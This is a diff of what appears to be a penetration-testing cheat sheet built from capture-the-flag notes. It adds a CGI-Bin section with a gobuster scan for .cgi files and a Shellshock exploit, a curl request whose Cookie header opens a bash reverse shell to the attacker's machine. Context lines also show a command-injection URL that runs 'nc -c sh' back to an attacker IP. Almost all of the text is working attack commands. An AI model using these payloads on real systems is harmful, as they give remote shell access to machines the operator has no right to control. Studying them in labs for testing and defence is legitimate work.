@@ -52,10 +52,6 @@ zip revshell.zip revshell.php
 nc -lvnp 443
 ```
 
-
-
-
-
 ## TomCat
 
 ### Common usernames and passwords
@@ -112,6 +108,48 @@ nc -lvnp 1337
 ```
 view-source:http://$VICTIM:22/nnxhweOV/index.php?cmd=nc%20-c%20sh%2010.10.154.80%201337
 ```
+
+
+
+## CGI-Bin
+
+### Scanning
+
+**Examples**
+
+[0day.md](../../walkthroughs/tryhackme/0day.md "mention")
+
+See if a cgi-bin folder appears in the inital scans, if it does start scanning that direcoty for .cgi files.
+
+**Kali**
+
+```
+gobuster dir -u http://$VICTIM/cgi-bin/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,cgi
+```
+
+<figure><img src="../../.gitbook/assets/image (435).png" alt=""><figcaption></figcaption></figure>
+
+### Shell
+
+**Examples**
+
+[0day.md](../../walkthroughs/tryhackme/0day.md "mention")
+
+**Link:** [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi)
+
+**Kali#1**
+
+```
+nc -lvnp 4242
+```
+
+**Kali #2**
+
+```
+curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/$KALI/4242 0>&1' http://$VICTIM/cgi-bin/test.cgi 
+```
+
+<figure><img src="../../.gitbook/assets/image (429).png" alt=""><figcaption></figcaption></figure>
 
 
 
